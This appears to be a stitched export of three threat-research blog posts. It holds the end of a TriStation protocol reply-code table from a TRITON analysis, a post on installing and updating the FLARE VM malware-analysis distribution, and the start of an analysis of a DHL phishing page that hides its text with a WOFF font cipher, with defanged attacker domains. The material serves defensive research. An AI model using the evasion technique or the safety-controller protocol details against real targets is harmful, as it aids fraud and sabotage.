    <tr>
      <td width="108" valign="top"><p>73</p> </td> <td width="372"
          valign="top"><p>115: '&lt;115&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>74</p> </td> <td width="372"
          valign="top"><p>116: '&lt;116&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>75</p> </td> <td width="372"
          valign="top"><p>117: 'Module configured',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>76</p> </td> <td width="372"
          valign="top"><p>118: '&lt;118&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>77</p> </td> <td width="372"
          valign="top"><p>119: 'Get chassis status response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>78</p> </td> <td width="372"
          valign="top"><p>120: 'Vectors response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>79</p> </td> <td width="372"
          valign="top"><p>121: 'Get I/O point values response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7A</p> </td> <td width="372"
          valign="top"><p>122: 'Calendar changed',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7B</p> </td> <td width="372"
          valign="top"><p>123: 'Configuration updated',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7C</p> </td> <td width="372"
          valign="top"><p>124: 'Get minimum scan time response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7D</p> </td> <td width="372"
          valign="top"><p>125: '&lt;125&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7E</p> </td> <td width="372"
          valign="top"><p>126: 'Node number set',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>7F</p> </td> <td width="372"
          valign="top"><p>127: 'Get MP status response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>80</p> </td> <td width="372"
          valign="top"><p>128: 'Retentive values set',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>81</p> </td> <td width="372"
          valign="top"><p>129: 'SOE block set',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>82</p> </td> <td width="372"
          valign="top"><p>130: 'Module alarms cleared',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>83</p> </td> <td width="372"
          valign="top"><p>131: 'Get event log response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>84</p> </td> <td width="372"
          valign="top"><p>132: 'Symbol table ccepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>85</p> </td> <td width="372"
          valign="top"><p>133: 'OVD enable accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>86</p> </td> <td width="372"
          valign="top"><p>134: 'OVD disable accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>87</p> </td> <td width="372"
          valign="top"><p>135: 'Record event log response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>88</p> </td> <td width="372"
          valign="top"><p>136: 'Upload network response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>89</p> </td> <td width="372"
          valign="top"><p>137: 'Get SOE data response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8A</p> </td> <td width="372"
          valign="top"><p>138: 'Alocate network accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8B</p> </td> <td width="372"
          valign="top"><p>139: 'Load vector table accepted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8C</p> </td> <td width="372"
          valign="top"><p>140: 'Get calendar response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8D</p> </td> <td width="372"
          valign="top"><p>141: 'Label set',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8E</p> </td> <td width="372"
          valign="top"><p>142: 'Get module types response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>8F</p> </td> <td width="372"
          valign="top"><p>143: 'System variables configured',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>90</p> </td> <td width="372"
          valign="top"><p>144: 'Module deconfigured',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>91</p> </td> <td width="372"
          valign="top"><p>145: '&lt;145&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>92</p> </td> <td width="372"
          valign="top"><p>146: '&lt;146&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>93</p> </td> <td width="372"
          valign="top"><p>147: 'Get conversion table response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>94</p> </td> <td width="372"
          valign="top"><p>148: 'ICM print data sent',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>95</p> </td> <td width="372"
          valign="top"><p>149: 'Set ICM status response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>96</p> </td> <td width="372"
          valign="top"><p>150: 'Get system variables response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>97</p> </td> <td width="372"
          valign="top"><p>151: 'Get module versions response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>98</p> </td> <td width="372"
          valign="top"><p>152: 'Process MODBUS response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>99</p> </td> <td width="372"
          valign="top"><p>153: 'Allocate program response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9A</p> </td> <td width="372"
          valign="top"><p>154: 'Allocate function response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9B</p> </td> <td width="372"
          valign="top"><p>155: 'Clear retentives response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9C</p> </td> <td width="372"
          valign="top"><p>156: 'Set initial values response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9D</p> </td> <td width="372"
          valign="top"><p>157: 'Set TS2 data area response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9E</p> </td> <td width="372"
          valign="top"><p>158: 'Get TS2 data response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>9F</p> </td> <td width="372"
          valign="top"><p>159: 'Set TS2 data response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A0</p> </td> <td width="372"
          valign="top"><p>160: 'Set program information reponse',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A1</p> </td> <td width="372"
          valign="top"><p>161: 'Get program information response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A2</p> </td> <td width="372"
          valign="top"><p>162: 'Upload program response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A3</p> </td> <td width="372"
          valign="top"><p>163: 'Upload function response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A4</p> </td> <td width="372"
          valign="top"><p>164: 'Get point groups response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A5</p> </td> <td width="372"
          valign="top"><p>165: 'Allocate symbol table response',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A6</p> </td> <td width="372"
          valign="top"><p>166: 'Program timing response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A7</p> </td> <td width="372"
          valign="top"><p>167: 'Disable points full',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A8</p> </td> <td width="372"
          valign="top"><p>168: 'Allocate multiple functions
        response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>A9</p> </td> <td width="372"
          valign="top"><p>169: 'Get node number response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AA</p> </td> <td width="372"
          valign="top"><p>170: 'Symbol table response',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AB</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AC</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AD</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AE</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>AF</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B0</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B1</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B2</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B3</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B4</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B5</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B6</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B7</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B8</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>B9</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BA</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BB</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BC</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BD</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BE</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>BF</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C0</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C1</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C2</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C3</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C4</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C5</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C6</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C7</p> </td> <td width="372"
      valign="top"> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C8</p> </td> <td width="372"
          valign="top"><p>200: 'Wrong command',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>C9</p> </td> <td width="372"
          valign="top"><p>201: 'Load is in progress',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CA</p> </td> <td width="372"
          valign="top"><p>202: 'Bad clock calendar data',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CB</p> </td> <td width="372"
          valign="top"><p>203: 'Control program not halted',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CC</p> </td> <td width="372"
          valign="top"><p>204: 'Control program checksum error',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CD</p> </td> <td width="372"
          valign="top"><p>205: 'No memory available',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CE</p> </td> <td width="372"
          valign="top"><p>206: 'Control program not valid',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>CF</p> </td> <td width="372"
          valign="top"><p>207: 'Not loading a control program',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D0</p> </td> <td width="372"
          valign="top"><p>208: 'Network is out of range',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D1</p> </td> <td width="372"
          valign="top"><p>209: 'Not enough arguments',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D2</p> </td> <td width="372"
          valign="top"><p>210: 'A Network is missing',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D3</p> </td> <td width="372"
          valign="top"><p>211: 'The download time mismatches',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D4</p> </td> <td width="372"
          valign="top"><p>212: 'Key setting prohibits this
        operation',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D5</p> </td> <td width="372"
          valign="top"><p>213: 'Bad control program version',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D6</p> </td> <td width="372"
          valign="top"><p>214: 'Command not in correct sequence',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D7</p> </td> <td width="372"
          valign="top"><p>215: '&lt;215&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D8</p> </td> <td width="372"
          valign="top"><p>216: 'Bad Index for a module',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>D9</p> </td> <td width="372"
          valign="top"><p>217: 'Module address is invalid',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DA</p> </td> <td width="372"
          valign="top"><p>218: '&lt;218&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DB</p> </td> <td width="372"
          valign="top"><p>219: '&lt;219&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DC</p> </td> <td width="372"
          valign="top"><p>220: 'Bad offset for an I/O point',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DD</p> </td> <td width="372"
          valign="top"><p>221: 'Invalid point type',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DE</p> </td> <td width="372"
          valign="top"><p>222: 'Invalid Point Location',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>DF</p> </td> <td width="372"
          valign="top"><p>223: 'Program name is invalid',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E0</p> </td> <td width="372"
          valign="top"><p>224: '&lt;224&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E1</p> </td> <td width="372"
          valign="top"><p>225: '&lt;225&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E2</p> </td> <td width="372"
          valign="top"><p>226: '&lt;226&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E3</p> </td> <td width="372"
          valign="top"><p>227: 'Invalid module type',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E4</p> </td> <td width="372"
          valign="top"><p>228: '&lt;228&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E5</p> </td> <td width="372"
          valign="top"><p>229: 'Invalid table type',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E6</p> </td> <td width="372"
          valign="top"><p>230: '&lt;230&gt;',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E7</p> </td> <td width="372"
          valign="top"><p>231: 'Invalid network continuation',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E8</p> </td> <td width="372"
          valign="top"><p>232: 'Invalid scan time',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>E9</p> </td> <td width="372"
          valign="top"><p>233: 'Load is busy',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>EA</p> </td> <td width="372"
          valign="top"><p>234: 'An MP has re-educated',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>EB</p> </td> <td width="372"
          valign="top"><p>235: 'Invalid chassis or slot',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>EC</p> </td> <td width="372"
          valign="top"><p>236: 'Invalid SOE number',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>ED</p> </td> <td width="372"
          valign="top"><p>237: 'Invalid SOE type',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>EE</p> </td> <td width="372"
          valign="top"><p>238: 'Invalid SOE state',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>EF</p> </td> <td width="372"
          valign="top"><p>239: 'The variable is write protected',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F0</p> </td> <td width="372"
          valign="top"><p>240: 'Node number mismatch',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F1</p> </td> <td width="372"
          valign="top"><p>241: 'Command not allowed',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F2</p> </td> <td width="372"
          valign="top"><p>242: 'Invalid sequence number',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F3</p> </td> <td width="372"
          valign="top"><p>243: 'Time change on non-master TRICON',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F4</p> </td> <td width="372"
          valign="top"><p>244: 'No free Tristation ports',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F5</p> </td> <td width="372"
          valign="top"><p>245: 'Invalid Tristation I command',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F6</p> </td> <td width="372"
          valign="top"><p>246: 'Invalid TriStation 1131 command',</p>
      </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F7</p> </td> <td width="372"
          valign="top"><p>247: 'Only one chassis allowed',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F8</p> </td> <td width="372"
          valign="top"><p>248: 'Bad variable address',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>F9</p> </td> <td width="372"
          valign="top"><p>249: 'Response overflow',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FA</p> </td> <td width="372"
          valign="top"><p>250: 'Invalid bus',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FB</p> </td> <td width="372"
          valign="top"><p>251: 'Disable is not allowed',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FC</p> </td> <td width="372"
          valign="top"><p>252: 'Invalid length',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FD</p> </td> <td width="372"
          valign="top"><p>253: 'Point cannot be disabled',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FE</p> </td> <td width="372"
          valign="top"><p>254: 'Too many retentive variables',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"><p>FF</p> </td> <td width="372"
          valign="top"><p>255: 'LOADER_CONNECT',</p> </td> </tr>
    <tr>
      <td width="108" valign="top"> </td> <td width="372"
          valign="top"><p>256: 'Unknown reject code'</p> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2018/06/totally-tubular-treatise-on-triton-and-tristation.html2018-06-07T14:00:00.000Z2021-02-16T17:45:46.858ZFLARE VM Updatenoemail@noemail.orgNhan Huynh<p>FLARE VM is the first of its kind reverse engineering and malware
  analysis distribution on Windows platform. Since its <a
    href="https://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html">introduction
    in July 2017</a>, FLARE VM has been continuously trusted and used by
  many reverse engineers, malware analysts, and security researchers as
  their go-to environment for analyzing malware. Just like the
  ever-evolving security industry, FLARE VM has gone through many major
  changes to better support our users’ needs. FLARE VM now has a new
  installation, upgrade, and uninstallation process, which is a long
  anticipated feature requested by our users. FLARE VM also includes
  many new tools such as IDA 7.0, radare and YARA. Therefore, we would
  like to share these updates, especially the new installation process.</p>
 <h4>Installation</h4>
 <p>We strongly recommend you use FLARE VM within a virtualized
  environment for malware analysis to protect and isolate your physical
  device and network from malicious activities. We assume you already
  have experience setting up and configuring your own virtualized
  environment. Please create a new virtual machine (VM) and perform a
  fresh installation of Windows. FLARE VM is designed to be installed on
  Windows 7 Service Pack 1 or newer; therefore, you can select a version
  of windows that best suits your needs. From this point forward, all
  installation steps should be performed within your VM.</p>
 <p>Once you have a VM with a fresh installation of Windows, use one of
  the following URLs to download the compressed FLARE VM repository onto
  your VM:</p>
 <ul style="list-style-position: inside;"> <li>
    <a href="https://github.com/fireeye/flare-vm"
  target="_blank">https://github.com/fireeye/flare-vm</a></li> <li>
    <a href="https://flarevm.info"
  target="_blank">https://flarevm.info</a></li> </ul>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareVMupdate/Picture1.png" />
  <br /> <span class="type-XS">Figure 1: Download FLARE VM repo</span></p>
 <p>Then, use the following steps to install FLARE VM:</p>
 <ol style="list-style-position: inside;"> <li>Decompress the FLARE VM
    repository to a directory of your choosing.</li> <li>Start a new
    session of PowerShell with escalated privileges. FLARE VM attempts
    to install additional software and modify system settings;
    therefore, escalated privileges are required for installation.</li>
    <li>Within PowerShell, change directory to the location where you
    have decompressed the FLARE VM repository.</li> <li>Enable
    unrestricted execution policy for PowerShell by executing the
    following command and answering “Y” when prompted by PowerShell:
    Set-ExecutionPolicy unrestricted</li> <li>Execute the install.ps1
    installation script. You will be prompted to enter the current
    user’s password. FLARE VM needs the current user’s password to
    automatically login after a reboot when installing. Optionally, you
    can specify the current user’s password by passing the “-password
    &lt;current_user_password&gt;” at the command line.</li> </ol>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareVMupdate/Picture2.png" />
  <br /> <span class="type-XS">Figure 2: Start PowerShell as administrator</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareVMupdate/Picture3.png" />
  <br /> <span class="type-XS">Figure 3: Ready to install FLARE VM</span></p>
 <p>The rest of the installation process is fully automated. Depending
  upon your internet speed the entire installation may take up to one
  hour to finish. The VM also reboots multiple times due to the numerous
  software installations’ requirements. Once the installation completes,
  the PowerShell prompt remains open waiting for you to hit any key
  before exiting. After completing the installation, you will be
  presented with the following desktop environment:</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareVMupdate/Picture4.png" />
  <br /> <span class="type-XS">Figure 4: FLARE VM installation completes</span></p>
 <p>Congratulations! You have successfully installed FLARE VM. At this
  point we recommend you power off the VM, switch the VM networking mode
  to Host-Only, and then take a snapshot to save a clean state of your
  analysis VM.</p>
 <h4>Improvement</h4>
 <p>The biggest improvement for FLARE VM is the ability to perform a
  proper update and uninstallation. The older version of FLARE VM came
  as a PowerShell script to install many chocolatey packages, one at a
  time; therefore, we were unable to include new packages when updating
  FLARE VM. In the past, our users had to reinstall FLARE VM completely,
  which is time consuming, or manually install the new package, which is
  error prone. To solve this issue, we have converted FLARE VM itself
  into a chocolatey package. Whenever a new tool is available we will
  also release a new version of FLARE VM. With this new design we can
  simply execute “choco upgrade all” to get the newest version of FLARE
  VM along with any new packages we have released. You can also safely
  uninstall all FLARE VM packages by executing “choco uninstall flarevm.installer.flare”.</p>
 <p>Our new FLARE VM is also updated to use Python 3.7 as the default
  Python interpreter. As a result, many python scripts may fail to
  execute. To maintain support for older scripts, we keep Python 2.7
  installed in parallel with Python 3.7. We can easily switch between
  different versions by using the Python launcher. Run “py -2.7
  &lt;path_to_python_script&gt;” to use Python 2.7, or “py
  &lt;path_to_python_script&gt;” to use the default Python 3.7
  interpreter. For more details on the Python launcher, please refer to
  the following URL: https://docs.python.org/3/using/windows.html#launcher.</p>
 <p>Additionally, the new FLARE VM changes the location where Fakenet-NG
  saves its output when launched via the shortcut in the FLARE folder or
  taskbar pin. Instead of saving directly to the desktop, to reduce
  clutter, Fakenet-NG will store all its output in “Desktop\fakenet_logs”.</p>
 <p>Compared to older versions this version of FLARE VM comes with many
  new tools and software packages. Most notably, this release adds the following:</p>
 <ul style="list-style-position: inside;"> <li>IDA Free 7.0</li>
    <li>radare2 to support 64-bit disassembly</li> <li>The labs for the
      <a
      href="https://www.amazon.com/Practical-Malware-Analysis-Hands-Dissecting/dp/1593272901">Practical
      Malware Analysis</a> book</li> <li>pdfid, pdf-parser, and
    PdfStreamdumper to analyze malicious PDF documents</li> <li>The
    Malcode Analyst Pack</li> <li>Yara for signature matching</li>
    <li>The Cygwin Linux environment on windows</li> <li>PowerShell
    transcription and script block logging<ul> <li>PowerShell
        transcripts can be found in “Desktop\PS_Transcripts”</li> </ul>
  </li> </ul>
 <h4>Available Packages</h4>
 <p>While we attempt to make the tools available as shortcuts within the
  FLARE folder, there are several available from command-line only.
  Please see the <a href="http://FLAREVM.info">online
  documentation</a> for the most up to date list. Here is an incomplete
  list of some major tools available on FLARE VM:</p>
 <ul style="list-style-position: inside;"> <li>Disassemblers:<ul>
        <li>IDA Free 5.0 and IDA Free 7.0</li> <li>Binary Ninja</li>
        <li>Radare2 and Cutter</li> </ul> </li> <li>Debuggers:<ul>
        <li>OllyDbg and OllyDbg2</li> <li>x64dbg</li> <li>Windbg</li>
    </ul> </li> <li>File Format parser:<ul> <li>CFF Explorer, PEView,
      PEStudio</li> <li>PdfStreamdumper, pdf-parser, pdfid</li>
      <li>ffdec</li> <li>offvis and officemalscanner</li>
      <li>PE-bear</li> </ul> </li> <li>Decompilers:<ul> <li>RetDec</li>
        <li>Jd-gui and bytecode-viewer</li> <li>dnSpy</li> <li>IDR</li>
      <li>VBDecompiler</li> <li>Py2ExeDecompiler</li> </ul> </li>
    <li>Monitoring tools:<ul> <li>SysInternal suite</li>
      <li>RegShot</li> </ul> </li> <li>Utilities:<ul> <li>Hex Editors
        (010 editor, HxD and File Insight)</li> <li>FLOSS (FireEye Labs
        Obfuscated String Solver)</li> <li>Fakenet-NG</li> <li>Yara</li>
        <li>Malware Analyst Pack</li> </ul> </li> </ul>
 <h4>Conclusion</h4>
 <p>The FLARE team continues to support and improve FLARE VM to be the
  de facto distribution for security research, incident response, and
  malware analysis on Windows platform. We greatly appreciate the
  numerous bug reports, tool requests, and feature recommendations from
  everyone. We hope FLARE VM, along with many other FLARE open source
  projects, can help you do your work better, easier, and faster.</p>
 <p>We are always looking for talented folks to join our team. The FLARE
  Team may be a good place for you if:</p>
 <ul style="list-style-position: inside;"> <li>You eat, sleep, and speak
    disassembly and malware all day long.</li> <li>You would like to
    push the state of the art for reverse engineering and malware
  analysis.</li> </ul>
 <p>Please check out our <a
    href="https://www.fireeye.com/company/jobs.html">careers page</a>,
  or send us an email. Happy Reversing!</p>
http://www.fireeye.com/blog/threat-research/2018/11/flare-vm-update.html2018-11-14T20:00:00.000Z2021-02-12T21:54:49.177ZPhishing Campaign Leverages WOFF Obfuscation and Telegram Channels for Communicationnoemail@noemail.orgBernard Sapaden<p>FireEye <a
    href="/content/fireeye-www/en_US/products/email-security.html">Email
  Security</a> recently encountered various phishing campaigns, mostly
  in the Americas and Europe, using source code obfuscation with
  compromised or bad domains. These domains were masquerading as
  authentic websites and stole personal information such as credit card
  data. The stolen information was then shared to cross-platform,
  cloud-based instant messaging applications.</p>
 <p>Coming off a busy holiday season with a massive surge in deliveries,
  this post highlights a phishing campaign involving a fake DHL tracking
  page. While phishing attacks targeting users of shipping services is
  not new, the techniques used in these examples are more complex than
  what would be found in an off-the-shelf phishing kit.</p>
 <p>This campaign uses a WOFF-based substitution cypher, localization
  specific targeting, and various evasion techniques which we unravel
  here in this blog.</p>
 <h4>Attack Flow</h4>
 <p>The attack starts with an email imitating DHL, as seen in Figure
    1<i>. </i>The email tries to trick the recipient into clicking on a
  link, which would take them to a fake DHL website. In Figure 2, we can
  see the fake page asking for credit card details that, if submitted,
  would give the user a generic response while in the background the
  credit card data is shared with the attackers.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: DHL phishing attempt</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Fake website imitating DHL tracking</span></p>
 <p>This DHL phishing campaign uses a rare technique for obfuscating its
  source page. The page source contains proper strings, valid tags, and
  appropriate formatting, but contains encoded text that would render
  gibberish without decoding prior to loading the page, as seen in
  Figure 3. Typically, decoding such text is done by including script
  functions within the code. Yet in this case, the decoding functions
  are not contained in the script.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Snippet of the encoded text on
    page source</span></p>
 <p>The decoding is done by a Web Open Font Format (WOFF) font file,
  which happens upon loading the page in a browser and will not be
  visible in the page content itself. Figure 4 shows the substitution
  cipher method and the WOFF font file. The attacker does this to evade
  detection by security vendors. Many security vendors use static or
  regex signature-based rules, so this method will break those
  naïve-based conditions.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: WOFF substitution cipher</span></p>
 <p>Loading this custom font which decodes the text is done inside the
  Cascading Style Sheets (CSS). This technique is rare as JavaScript
  functions are traditionally used to encrypt and decrypt HTML text.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: CSS file for loading WOFF font file</span></p>
 <p>Figure 5 shows the CSS file used to load the WOFF font file. We have
  also seen the same CSS file, style.css, being hosted on the following domains:</p>
 <ul> <li>hxxps://www.lifepointecc[.]com/wp-content/sinin/style.css</li>
  <li>hxxps://candyman-shop[.]com/auth/DHL_HOME/style.css</li>
  <li>hxxps://mail.rsi-insure[.]com/vendor/ship/dhexpress/style.css</li>
  <li>hxxps://www.scriptarticle[.]com/thro/HOME/style.css</li> </ul>
 <p>These legitimate-looking domains are not hosting any phishing
  websites as of now; instead, they appear to be a repository for
  attackers to use in their phishing campaigns. We have seen similar
  phishing attacks targeting the banking sector in the past, but this is
  newer for delivery websites.  </p>
 <h4>Notable Techniques</h4>
 <h5>Localization</h5>
 <p>The phishing page displays the local language based on the region of
  the targeted user. The localization code (Figure 6) supports major
  languages spoken in Europe and the Americas such as Spanish, English,
  and Portuguese.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/woff/fig6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Localization code</span></p>
 <p>The backend contains PHP resource files for each supported language
  (Figure 7), which are picked up dynamically based on the user’s IP
  address location.</p>
